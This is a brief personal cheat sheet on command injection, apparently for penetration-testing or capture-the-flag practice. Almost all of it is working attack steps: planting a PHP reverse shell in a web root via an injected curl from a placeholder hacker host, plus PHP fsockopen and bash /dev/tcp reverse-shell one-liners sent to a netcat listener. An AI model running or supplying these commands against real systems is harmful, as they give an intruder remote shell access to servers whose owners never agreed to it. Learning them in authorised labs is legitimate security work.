---
title: COMMAND INJECTION
updated: 2023-10-02 04:58:19Z
created: 2023-10-01 13:02:24Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# COMMAND INJECTION
1. Create reverse shell (if characters like ; get filtered, use **php-reverse-shell**)
`cp /usr/share/webshells/laudanum/php/php-reverse-shell.php .`
2. Update php-reverse-shell.php 
```
$ip = '<haker IP>';  // CHANGE THIS
$port = 5555;       // CHANGE THIS
```
3. server file over http
`python3 -m http.server`
4. On target, append to command:
`&& curl <hacker IP>/php-reverse-shell.php > /var/www/html/php-reverse-shell.php`
***
Alternativy, send a payload for a reverse shell
1. First, set a listener on port 4444
`nc -lnvp 4444`
2. Send a reverse shell payload
**PHP**: `php -r '$sock=fsockopen("<hacker IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
**BASH**: `bash -i >& /dev/tcp/<hacker IP>/4444 0>&1`

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
***
